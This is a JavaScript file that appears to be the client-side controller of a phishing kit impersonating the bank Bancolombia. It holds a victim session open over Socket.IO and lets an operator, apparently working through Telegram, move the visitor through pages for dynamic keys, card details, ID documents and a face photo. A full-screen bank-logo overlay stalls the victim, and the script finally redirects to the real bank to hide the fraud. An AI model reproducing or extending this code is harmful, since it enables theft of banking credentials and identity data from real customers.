// Variables globales
let globalSocket = null;
let globalSessionId = null;
let keepAliveInterval = null;
let loadingOverlayInstance = null;

// Inicializar sesión
function initGlobalSession() {
    try {
        // Recuperar o crear nueva sesión
        globalSessionId = localStorage.getItem('bancolombia_session') || 
                         sessionStorage.getItem('currentSession') ||
                         `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        // Persistir sesión
        localStorage.setItem('bancolombia_session', globalSessionId);
        sessionStorage.setItem('currentSession', globalSessionId);
        localStorage.setItem('bancolombia_session_timestamp', Date.now().toString());
        
        window.globalSessionId = globalSessionId;
        
        console.log('Sesión inicializada:', globalSessionId);
        return globalSessionId;
    } catch (error) {
        console.error('Error inicializando sesión:', error);
        globalSessionId = `session_${Date.now()}_fallback`;
        window.globalSessionId = globalSessionId;
        return globalSessionId;
    }
}

// Mantener sesión activa
function emitKeepAlive() {
    if (globalSocket && globalSocket.connected) {
        globalSocket.emit('keepAlive', {
            sessionId: globalSessionId,
            timestamp: Date.now(),
            page: window.location.pathname
        });
    }
}

// Inicializar socket
function initializeSocket() {
    try {
        if (globalSocket) {
            globalSocket.removeAllListeners();
            globalSocket.disconnect();
            globalSocket = null;
        }

        globalSocket = io({
            reconnection: true,
            reconnectionAttempts: 10,
            reconnectionDelay: 1000,
            reconnectionDelayMax: 5000,
            timeout: 20000,
            transports: ['polling', 'websocket'],
            upgrade: true,
            autoConnect: true,
            query: { 
                sessionId: globalSessionId,
                page: window.location.pathname
            }
        });

        globalSocket.on('connect', () => {
            console.log('✅ Conectado al servidor Socket.IO');
            console.log('Socket ID:', globalSocket.id);
            
            globalSocket.emit('initSession', { 
                sessionId: globalSessionId,
                page: window.location.pathname,
                timestamp: Date.now()
            });

            if (keepAliveInterval) clearInterval(keepAliveInterval);
            keepAliveInterval = setInterval(emitKeepAlive, 5000);
        });

        globalSocket.on('disconnect', (reason) => {
            console.log('⚠️ Desconectado:', reason);
            if (keepAliveInterval) clearInterval(keepAliveInterval);
        });

        globalSocket.on('connect_error', (error) => {
            console.error('❌ Error de conexión:', error.message);
        });

        globalSocket.on('error', (error) => {
            console.error('❌ Error de socket:', error);
        });

        return globalSocket;
    } catch (error) {
        console.error('❌ Error inicializando socket:', error);
        return null;
    }
}

// Crear overlay de carga
function createLoadingOverlay() {
    if (loadingOverlayInstance) {
        return loadingOverlayInstance;
    }

    const existingOverlay = document.querySelector('.loading-overlay');
    if (existingOverlay) existingOverlay.remove();

    const overlay = document.createElement('div');
    overlay.className = 'loading-overlay';
    overlay.innerHTML = `
        <div class="loading-content">
            <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
        </div>
    `;

    Object.assign(overlay.style, {
        position: 'fixed',
        top: '0',
        left: '0',
        width: '100%',
        height: '100%',
        backgroundColor: 'rgba(0, 0, 0, 0.95)',
        display: 'none',
        justifyContent: 'center',
        alignItems: 'center',
        zIndex: '9999'
    });

    overlay.show = function() {
        this.style.display = 'flex';
        this.classList.add('active');
        document.body.style.overflow = 'hidden';
        
        // Prevenir diálogos de salida
        window.onbeforeunload = null;
        window.onunload = null;
    };

    overlay.hide = function() {
        this.style.display = 'none';
        this.classList.remove('active');
        document.body.style.overflow = '';
    };

    document.body.appendChild(overlay);
    loadingOverlayInstance = overlay;
    return overlay;
}

// Configurar acciones de Telegram
function setupTelegramActions() {
    try {
        if (!globalSessionId) initGlobalSession();
        if (!globalSocket || !globalSocket.connected) globalSocket = initializeSocket();
        
        globalSocket.removeAllListeners('telegramAction');
        
        const overlay = createLoadingOverlay();
        let processingActions = new Set();
        const MIN_ACTION_INTERVAL = 1000;
        let lastActionTime = 0;
        
        globalSocket.on('telegramAction', (data) => {
            if (!data || !data.action) {
                console.log('Datos inválidos');
                return;
            }

            // Validación de origen Telegram
            if (!data.fromTelegram || !data.telegramMessageId) {
                console.log('Acción no autorizada');
                return;
            }

            const now = Date.now();
            const actionKey = `${data.action}_${data.messageId}`;
            
            // Prevenir duplicados
            if (processingActions.has(actionKey) || (now - lastActionTime) < MIN_ACTION_INTERVAL) {
                return;
            }

            processingActions.add(actionKey);
            lastActionTime = now;

            // Confirmar recepción
            globalSocket.emit('actionReceived', {
                sessionId: globalSessionId,
                action: data.action,
                messageId: data.messageId,
                timestamp: now
            });

            // Navegar según acción
            const currentPage = window.location.pathname;
            const nextPage = `${data.action}.html`;
            
            if (currentPage.endsWith(nextPage)) {
                processingActions.delete(actionKey);
                return;
            }

            switch(data.action) {
                case 'index':
                case 'dinamica':
                case 'tarjeta':
                case 'terminos':
                case 'cedula':
                case 'cara':
                    window.location.href = nextPage;
                    break;
                case 'finalizar':
                    window.location.href = 'https://www.bancolombia.com/personas';
                    break;
                default:
                    console.log('Acción desconocida:', data.action);
                    processingActions.delete(actionKey);
            }
        });

        return true;
    } catch (error) {
        console.error('Error en setupTelegramActions:', error);
        return false;
    }
}

// Verificar estado de sesión
function checkSession() {
    try {
        if (!globalSocket || !globalSessionId) {
            console.error('Sesión no inicializada');
            return false;
        }

        if (!globalSocket.connected) {
            console.error('Socket desconectado');
            globalSocket.connect();
            return false;
        }

        localStorage.setItem('bancolombia_session_timestamp', Date.now().toString());
        return true;
    } catch (error) {
        console.error('Error en checkSession:', error);
        return false;
    }
}

// Inicializar sesión
initGlobalSession();

// API pública
window.bancolombia = {
    initGlobalSession,
    initializeSocket,
    createLoadingOverlay,
    setupTelegramActions,
    checkSession,
    getSocket: () => globalSocket,
    getSessionId: () => globalSessionId
};